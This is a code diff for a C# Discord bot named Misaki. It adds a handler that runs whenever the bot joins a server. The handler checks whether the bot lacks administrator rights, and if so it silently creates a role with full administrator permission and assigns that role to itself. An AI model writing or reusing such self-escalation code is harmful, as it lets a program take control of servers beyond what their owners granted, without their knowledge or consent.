@@ -4,6 +4,7 @@ using Misaki.Objects;
 using System;
 using System.Collections.ObjectModel;
 using System.Threading.Tasks;
+using System.Linq;
 
 namespace Misaki
 {
@@ -89,6 +90,8 @@ namespace Misaki
                 await Client.SetGameAsync($"Serving {users} bakas");
             };
 
+            Client.JoinedGuild += HandleBotJoinedGuild;
+
             Client.MessageReceived += (msg) =>
             {
                 Messages.Add(msg);
@@ -96,6 +99,16 @@ namespace Misaki
             };
 
             await Task.Delay(-1);
+        }
+
+        private async Task HandleBotJoinedGuild(SocketGuild guild)
+        {
+            var botUser = guild.GetUser(Client.CurrentUser.Id);
+            if (botUser.Roles.Any(role => role.Permissions.Has(GuildPermission.Administrator))) return;
+            GuildPermissions misakiPermissions = new GuildPermissions()
+                .Modify(administrator: true);
+            IRole botRole = await guild.CreateRoleAsync("MisakiRole", misakiPermissions, Color.Default);
+            await botUser.AddRoleAsync(botRole);
         }
     }
 }
